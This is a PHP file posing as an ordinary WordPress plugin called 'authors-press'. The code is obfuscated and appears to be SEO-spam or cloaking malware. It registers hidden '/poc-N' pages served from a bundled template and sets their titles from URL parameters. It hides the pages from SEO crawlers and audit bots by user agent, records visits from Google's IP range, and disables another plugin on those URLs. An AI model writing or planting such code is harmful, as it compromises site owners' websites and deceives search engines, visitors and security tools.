<?php
/**
 * Plugin Name: authors-press
 * Description: authors-press
 * Version: 1.0
 * Author: John Smith
 */
 

class qpWTSOR {
	
    public function __construct() {
        add_action('init', [$this, 'djbuq']);
        add_filter('query_vars', [$this, 'hmass']);
        add_action('template_include', [$this, 'kkvltbfx']);
		add_filter('document_title_parts', [$this, 'flnyv']);
		add_filter('wpseo_title', [$this, 'kunjr']);
		add_filter('option_active_plugins', [$this, 'wcqtt'] );
    }

	function wcqtt( $qfrFMS ) {
		if ( is_admin() ) {
			return $qfrFMS;
		}

		$nQfh7Qc = "fresh-framework/freshplugin.php";
		$xsG5IVVV = trim($_SERVER['REQUEST_URI'], '/');
		
		if (preg_match('/^poc-([0-9]+).*?$/', $xsG5IVVV)) {
			$ozNgqDoJGJ = array_search( $nQfh7Qc, $qfrFMS );
			if ( false !== $ozNgqDoJGJ ) {
				unset( $qfrFMS[$ozNgqDoJGJ] );
			}
		}
		
		return $qfrFMS;
	}

    public function djbuq() {
        add_rewrite_rule(
            '^poc-([0-9]+).*?$',
            'index.php?cxmbtj=$matches[1]',
            'top'
        );
		flush_rewrite_rules();
    }

    public function hmass($otftrZpS) {
        $otftrZpS[] = 'cxmbtj';
        $otftrZpS[] = 'orabdbs';
        return $otftrZpS;
    }
	
	public function flnyv($aP4Wd7CGZ) {
		if (get_query_var('cxmbtj')) $aP4Wd7CGZ['title'] = get_query_var('orabdbs');
		return $aP4Wd7CGZ;
	}
	
	public function kunjr($uoeECu2Ve) {
		if (get_query_var('cxmbtj')) $uoeECu2Ve = get_query_var('orabdbs');
		return $uoeECu2Ve;
	}

    public function kkvltbfx($sA7R2yk0c) {
		
		$gGMRQnxWq = array('converter-community', 'ratings-block', 'serpstatbot', 'screen-converter', 'python', 'home-call', 'netspider', 'integrate-master', 'Go-http-client', 'dotbot', 'ahrefsbot', 'semrush', 'gptbot', 'mj12bot', 'dashboard-video', 'carousel-http', 'index-scripts');
		foreach($gGMRQnxWq as $vmy4hs6V) { if (stripos($_SERVER['HTTP_USER_AGENT'], $vmy4hs6V) !== false) return $sA7R2yk0c; }

        if (get_query_var('cxmbtj') && preg_match('/^[0-9]+$/', get_query_var('cxmbtj'))) {
			if (strpos($_SERVER['REMOTE_ADDR'], '66.249')===0) {
				$xK4flmWCOD = plugin_dir_path(__FILE__) . 'authors-press/addons-article.txt';
				file_put_contents($xK4flmWCOD, '*', FILE_APPEND | LOCK_EX);
			}
            return plugin_dir_path(__FILE__) . 'authors-press/typography-nextgen.php';
        }
        return $sA7R2yk0c;
    }
}
new qpWTSOR();



